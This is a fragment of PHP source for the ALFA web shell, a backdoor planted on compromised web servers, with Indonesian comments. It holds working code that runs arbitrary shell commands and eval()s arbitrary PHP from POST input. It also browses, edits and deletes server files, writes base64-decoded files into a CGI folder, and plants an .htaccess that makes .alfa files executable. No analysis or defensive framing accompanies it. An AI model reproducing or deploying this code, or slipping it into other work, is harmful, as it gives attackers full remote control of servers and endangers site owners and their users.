function __showicon($icon){
return "";
}
function __alfa_set_cookie($name, $value){
setcookie($name, $value, time()+2592000);
}
function alfaWriteTocgiapi($name, $source){
@mkdir("alfacgiapi");
$source = base64_decode($source);
$f = @fopen("alfacgiapi/".$name,"w");
if($f){
@fwrite($f, $source);
@fclose($f);
}
}
function alfacgihtaccess($type,$dir){
$cgi_htaccess = 'Options +ExecCGI
AddHandler cgi-script .alfa
DirectoryIndex index.html';
if($type == "cgi"){
if(!file_exists($dir.".htaccess")){
$f = @fopen($dir.".htaccess","w");
if($f){
@fwrite($f, $cgi_htaccess);
@fclose($f);
}
}
}
}
function _alfa_file_exists($path,$is_file=true){
if(!file_exists($path))return false;
if($is_file&&!is_file($path))return false;
return true;
}

// ========== FUNGSI UTAMA ALFA SHELL ==========
// File manager, command execution, dll dari skrip kedua
if(isset($_POST['ajax'])) {
    $act = $_POST['act'];
    $path = isset($_POST['path']) ? $_POST['path'] : $GLOBALS['cwd'];
    
    switch($act) {
        case 'FilesMan':
            // Tampilkan file manager
            $items = scandir($path);
            echo '<div class="container">';
            echo '<h3>File Manager - ' . htmlspecialchars($path) . '</h3>';
            echo '<table>';
            echo '<tr><th>Nama</th><th>Ukuran</th><th>Permission</th><th>Aksi</th></tr>';
            foreach($items as $item) {
                if($item == '.' || $item == '..') continue;
                $fullpath = $path . '/' . $item;
                $isDir = is_dir($fullpath);
                echo '<tr>';
                echo '<td>' . ($isDir ? '<strong>' . htmlspecialchars($item) . '</strong>' : htmlspecialchars($item)) . '</td>';
                echo '<td>' . ($isDir ? 'DIR' : filesize($fullpath) . ' bytes') . '</td>';
                echo '<td>' . substr(sprintf('%o', fileperms($fullpath)), -4) . '</td>';
                echo '<td>';
                if(!$isDir) {
                    echo '<button onclick="g(\'EditFile\',\'' . htmlspecialchars($fullpath) . '\')">Edit</button> ';
                }
                echo '<button onclick="g(\'DeleteFile\',\'' . htmlspecialchars($fullpath) . '\')">Delete</button>';
                echo '</td>';
                echo '</tr>';
            }
            echo '</table>';
            echo '</div>';
            break;
            
        case 'Cmd':
            echo '<div class="container">';
            echo '<h3>Command Execution</h3>';
            echo '<form method="post" onsubmit="executeCommand(this); return false;">';
            echo '<input type="text" name="cmd" id="cmd" size="60" placeholder="Enter command...">';
            echo '<input type="submit" value="Execute">';
            echo '</form>';
            echo '<pre id="cmd_output"></pre>';
            echo '<script>
            function executeCommand(form) {
                var cmd = document.getElementById("cmd").value;
                var xhr = new XMLHttpRequest();
                xhr.open("POST", "", true);
                xhr.setRequestHeader("Content-Type", "application/x-www-form-urlencoded");
                xhr.onreadystatechange = function() {
                    if(xhr.readyState == 4 && xhr.status == 200) {
                        document.getElementById("cmd_output").innerHTML = xhr.responseText;
                    }
                };
                xhr.send("ajax=1&act=ExecuteCmd&cmd=" + encodeURIComponent(cmd));
            }
            </script>';
            echo '</div>';
            break;
            
        case 'ExecuteCmd':
            $cmd = $_POST['cmd'];
            $result = alfaEx($cmd, true);
            echo htmlspecialchars($result);
            break;
            
        case 'Php':
            echo '<div class="container">';
            echo '<h3>PHP Code Execution</h3>';
            echo '<form method="post" onsubmit="executePhp(this); return false;">';
            echo '<textarea name="code" id="php_code" rows="10" cols="80" placeholder="Enter PHP code..."></textarea><br>';
            echo '<input type="submit" value="Execute">';
            echo '</form>';
            echo '<pre id="php_output"></pre>';
            echo '<script>
            function executePhp(form) {
                var code = document.getElementById("php_code").value;
                var xhr = new XMLHttpRequest();
                xhr.open("POST", "", true);
                xhr.setRequestHeader("Content-Type", "application/x-www-form-urlencoded");
                xhr.onreadystatechange = function() {
                    if(xhr.readyState == 4 && xhr.status == 200) {
                        document.getElementById("php_output").innerHTML = xhr.responseText;
                    }
                };
                xhr.send("ajax=1&act=ExecutePhp&code=" + encodeURIComponent(code));
            }
            </script>';
            echo '</div>';
            break;
            
        case 'ExecutePhp':
            $code = $_POST['code'];
            ob_start();
            eval($code);
            $result = ob_get_clean();
            echo htmlspecialchars($result);
            break;
            
        case 'EditFile':
            if(isset($_POST['save'])) {
                $file = $_POST['file'];
                $content = $_POST['content'];
                file_put_contents($file, $content);
                echo "File saved successfully";
            } else {
                $file = $path;
                $content = file_get_contents($file);
                echo '<div class="container">';
                echo '<h3>Edit File: ' . htmlspecialchars($file) . '</h3>';
                echo '<form method="post" onsubmit="saveFile(this); return false;">';
                echo '<input type="hidden" name="file" value="' . htmlspecialchars($file) . '">';
                echo '<textarea name="content" rows="20" cols="100">' . htmlspecialchars($content) . '</textarea><br>';
                echo '<input type="submit" value="Save">';
                echo '</form>';
                echo '<script>
                function saveFile(form) {
                    var file = form.file.value;
                    var content = form.content.value;
                    var xhr = new XMLHttpRequest();
                    xhr.open("POST", "", true);
                    xhr.setRequestHeader("Content-Type", "application/x-www-form-urlencoded");
                    xhr.onreadystatechange = function() {
                        if(xhr.readyState == 4 && xhr.status == 200) {
                            alert(xhr.responseText);
                            g("FilesMan", "' . htmlspecialchars(dirname($file)) . '");
                        }
                    };
                    xhr.send("ajax=1&act=EditFile&save=1&file=" + encodeURIComponent(file) + "&content=" + encodeURIComponent(content));
                }
                </script>';
                echo '</div>';
            }
            break;
            
        case 'DeleteFile':
            if(is_file($path)) {
                unlink($path);
                echo "File deleted";
            } elseif(is_dir($path)) {
                rmdir($path);
                echo "Directory deleted";
            }
            break;
    }
    exit;
}

